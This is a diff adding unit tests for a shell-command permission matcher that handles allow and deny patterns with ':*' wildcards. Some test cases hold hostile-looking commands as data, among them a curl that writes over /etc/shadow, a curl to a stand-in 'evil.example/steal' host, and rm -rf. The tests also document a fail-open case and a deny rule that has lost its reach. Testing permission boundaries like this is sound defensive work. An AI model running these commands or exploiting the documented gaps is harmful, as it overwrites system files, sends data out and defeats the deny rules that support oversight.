@@ -331,6 +331,28 @@ class TestMatchCommandTokenBoundary(unittest.TestCase):
         self.assertFalse(matched)
         self.assertIsNone(pattern)
 
+    def test_colon_star_boundary_witness_shapes_a_person_would_not_write_by_hand(self):
+        """
+        Given multi-token ':*' prefixes whose base command has a same-prefixed sibling
+            ('git commit' / 'git commit-tree', 'uv run alembic' / 'uv run alembicfoo')
+        When match_command checks the sibling command against each pattern
+        Then none of the siblings match -- found by brute-forcing the matcher rather
+        than by hand, since these shapes are not ones a person thinks to write. Pins
+        the pre-existing token-boundary check itself, not this ticket's ':*'-at-end
+        recognition change (all four cases pass unchanged on either side of it).
+        """
+        cases = [
+            ("git commit:*", "git commit-tree abc"),
+            ("git commit:*", "git commitfoo -x"),
+            ("uv run alembic:*", "uv run alembicfoo upgrade"),
+            ("uv run:**", "uv runx"),
+        ]
+        for pattern, command in cases:
+            with self.subTest(pattern=pattern, command=command):
+                matched, matched_pattern = match_command(command, [pattern])
+                self.assertFalse(matched)
+                self.assertIsNone(matched_pattern)
+
     def test_a_bare_trailing_star_with_no_colon_is_a_plain_prefix(self):
         """
         Given the pattern 'ls*', written with no space or colon before the '*'
@@ -341,6 +363,179 @@ class TestMatchCommandTokenBoundary(unittest.TestCase):
         matched, pattern = match_command("lsof", ["ls*"])
         self.assertTrue(matched)
         self.assertEqual(pattern, "ls*")
+
+    def test_a_pattern_that_is_only_a_colon_star_does_not_raise(self):
+        """
+        Given a pattern with no command part at all before the trailing wildcard
+        (':*' or ':**')
+        When match_command checks an ordinary command with no leading space
+        Then it returns a plain (False, None) rather than raising -- an empty
+        cmd_pattern used to index the empty split() result and raise IndexError.
+        See test_a_bare_colon_star_matches_empty_or_leading_space_commands for
+        the two input shapes this does NOT hold for.
+        """
+        for pattern in (":*", ":**"):
+            with self.subTest(pattern=pattern):
+                matched, matched_pattern = match_command("ls -la", [pattern])
+                self.assertFalse(matched)
+                self.assertIsNone(matched_pattern)
+
+    def test_a_bare_colon_star_matches_empty_or_leading_space_commands(self):
+        """
+        Given a pattern with no command part at all before the trailing wildcard
+        (':*' or ':**')
+        When match_command checks an empty command, or one starting with a space
+        Then it matches -- a silent fail-open on those two shapes rather than
+        "matches nothing". Harmless in production: the command extractor
+        upstream strips leading whitespace and never emits an empty leaf, so
+        match_command never sees either shape from a real Bash invocation.
+        """
+        for pattern in (":*", ":**"):
+            with self.subTest(pattern=pattern):
+                matched, matched_pattern = match_command("", [pattern])
+                self.assertTrue(matched)
+                self.assertEqual(matched_pattern, pattern)
+
+                matched, matched_pattern = match_command(" ls", [pattern])
+                self.assertTrue(matched)
+                self.assertEqual(matched_pattern, pattern)
+
+
+class TestMatchCommandColonOnlyRecognisedAtPatternEnd(unittest.TestCase):
+    """
+    Claude Code's own rule: ':*' is recognised only when it is the pattern's literal
+    end. A ':' anywhere else -- mid-pattern, or inside a URL -- is a literal character,
+    not a cmd:args separator.
+    """
+
+    def test_mid_pattern_colon_star_does_not_act_as_a_wildcard(self):
+        """
+        Given the pattern 'git:* push', whose ':*' is not at the pattern's end
+        When match_command checks 'git checkout push'
+        Then it does not match -- the ':' is literal, so this is not the same as
+        'git * push'
+        """
+        matched, pattern = match_command("git checkout push", ["git:* push"])
+        self.assertFalse(matched)
+        self.assertIsNone(pattern)
+
+    def test_mid_pattern_colon_star_matches_its_own_literal_text(self):
+        """
+        Given the pattern 'git:* push'
+        When match_command checks the literal string 'git:* push'
+        Then it matches -- the '*' is a plain fnmatch wildcard that can match the
+        single '*' character in the command too
+        """
+        matched, pattern = match_command("git:* push", ["git:* push"])
+        self.assertTrue(matched)
+        self.assertEqual(pattern, "git:* push")
+
+    def test_a_colon_inside_a_url_does_not_split_the_pattern(self):
+        """
+        Given the pattern 'curl http://ex.com/*', whose only ':' sits inside a URL
+        When match_command checks 'curl http://ex.com/x'
+        Then it matches as a plain trailing-wildcard pattern -- the ':' is not
+        treated as a cmd:args separator
+        """
+        matched, pattern = match_command(
+            "curl http://ex.com/x", ["curl http://ex.com/*"]
+        )
+        self.assertTrue(matched)
+        self.assertEqual(pattern, "curl http://ex.com/*")
+
+
+class TestMatchCommandExplicitArgsAfterColonNoLongerSplit(unittest.TestCase):
+    """
+    Before this ticket, a pattern with literal text after a non-trailing ':'
+    (e.g. 'git commit:-m *') split there and matched the literal text as a second
+    fnmatch against the command's remainder. Claude Code recognises ':*' only at a
+    pattern's literal end (see TestMatchCommandColonOnlyRecognisedAtPatternEnd), so
+    this shape no longer splits -- a semantic narrowing, pinned here on a deny rule
+    since that is the direction where losing reach matters.
+    """
+
+    def test_explicit_args_after_colon_no_longer_match_the_command_they_used_to(self):
+        """
+        Given patterns whose ':' is followed by literal args text, not a bare '*'
+        When match_command checks a command with the same base but different args
+        Then none of them match -- the ':' is a literal character now, not a
+        cmd:args separator
+        """
+        cases = [
+            ("git commit:-m *", "git commit -m x"),
+            ("git push:--force *", "git push --force origin"),
+            ("rm:-rf /tmp/*", "rm -rf /tmp/foo"),
+            ("docker run:--privileged *", "docker run --privileged ubuntu"),
+            ("npm run:test", "npm run test"),
+            ("git commit: *", "git commit -m x"),
+        ]
+        for pattern, command in cases:
+            with self.subTest(pattern=pattern, command=command):
+                matched, matched_pattern = match_command(command, [pattern])
+                self.assertFalse(matched)
+                self.assertIsNone(matched_pattern)
+
+    def test_explicit_args_pattern_still_matches_its_own_literal_text(self):
+        """
+        Given a pattern of this shape
+        When match_command checks the command that names the pattern's ':' verbatim
+        Then it matches -- the pattern still means something: a whole-string
+        fnmatch treating the ':' as a literal character
+        """
+        matched, matched_pattern = match_command("git commit:-m x", ["git commit:-m *"])
+        self.assertTrue(matched)
+        self.assertEqual(matched_pattern, "git commit:-m *")
+
+    def test_a_deny_rule_of_this_shape_no_longer_blocks_the_command_it_named(self):
+        """
+        Given a deny pattern of this shape, and an allow pattern that would
+            otherwise let the command through
+        When check_permission evaluates the command the deny pattern used to name
+        Then the decision is 'allow' -- pinning the loss of reach a deny-rule
+        author relying on the old split would experience
+        """
+        decision, _ = check_permission(
+            "git push --force origin main",
+            allow_patterns=["git *"],
+            deny_patterns=["git push:--force *"],
+        )
+        self.assertEqual(decision, "allow")
+
+
+class TestMatchCommandColonPrefixWithOwnColonNowMatches(unittest.TestCase):
+    """
+    Before this ticket, a pattern like 'curl http://localhost:*' split at the FIRST
+    ':' -- the one inside the URL -- so its base command became 'curl http' and it
+    matched almost nothing. Restricting ':*' recognition to the pattern's literal
+    end (TestMatchCommandColonOnlyRecognisedAtPatternEnd) makes it an ordinary
+    boundary-checked prefix instead: the same change that narrows
+    TestMatchCommandExplicitArgsAfterColonNoLongerSplit's shape WIDENS this one.
+    Native-faithful (row 18 in docs/native-pattern-reference.md), but the silent
+    and permissive direction, so it is pinned on its own.
+    """
+
+    def test_a_colon_in_the_prefix_no_longer_blocks_the_trailing_colon_star(self):
+        """
+        Given patterns whose prefix itself contains a ':' before the trailing ':*'
+        When match_command checks a command with extra arguments after the prefix
+        Then each now matches -- all were False before this ticket
+        """
+        cases = [
+            ("curl http://localhost:*", "curl http://localhost"),
+            ("curl http://localhost:*", "curl http://localhost -o /etc/shadow"),
+            (
+                "curl http://localhost:*",
+                "curl http://localhost http://evil.example/steal",
+            ),
+            ("curl http://127.0.0.1:*", "curl http://127.0.0.1 -o /etc/shadow"),
+            ("psql postgres://u@h/db:*", "psql postgres://u@h/db -c x"),
+            ("scp x user@host:/tmp:*", "scp x user@host:/tmp -o extra"),
+        ]
+        for pattern, command in cases:
+            with self.subTest(pattern=pattern, command=command):
+                matched, matched_pattern = match_command(command, [pattern])
+                self.assertTrue(matched)
+                self.assertEqual(matched_pattern, pattern)
 
 
 class TestCheckPermission(unittest.TestCase):
